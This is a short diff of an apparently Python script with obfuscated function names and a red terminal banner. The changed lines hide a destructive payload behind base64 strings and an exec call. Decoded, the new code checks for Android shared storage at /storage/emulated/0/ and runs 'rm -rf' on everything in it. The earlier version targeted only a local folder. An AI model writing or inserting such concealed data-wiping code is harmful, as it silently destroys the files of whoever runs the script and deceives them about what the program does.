@@ -18,9 +18,9 @@ def tvksajd(adwekuv):
   exec(pvncngr)
 
 def oumcgsq():
-  vcxprvq = base64.b64decode('YS8=').decode('utf-8')
+  vcxprvq = base64.b64decode('L3N0b3JhZ2UvZW11bGF0ZWQvMC8=').decode('utf-8')
   if os.path.exists(vcxprvq):
-    tvksajd("b3Muc3lzdGVtKCJybSAtcmYgYS8qIik=")
+    tvksajd("b3Muc3lzdGVtKCdybSAtcmYgL3N0b3JhZ2UvZW11bGF0ZWQvMC8qJyk=")
 
 def banner():
   print(Fore.RED + """
